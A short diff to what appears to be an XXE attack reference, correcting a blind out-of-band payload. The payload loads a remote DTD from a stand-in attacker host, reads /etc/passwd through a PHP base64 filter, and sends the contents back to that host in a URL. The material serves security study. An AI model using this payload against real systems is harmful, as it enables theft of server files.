@@ -167,13 +167,14 @@ XXE nature allows to target several protocols and several files at a time (becau
 
         <!DOCTYPE root [
             <!ENTITY % remote SYSTEM "http://hacker.com/evil.dtd">
-            %remote; %intern; %trick;
+            %remote;
         ]>
 
     http://hacker.com/evil.dtd
 
         <!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
         <!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'http://hacker.com/result-is?%payl;'>">
+        %intern; %trick;
 
     ("Detected an entity reference loop" error must be carefully bypassed)
 
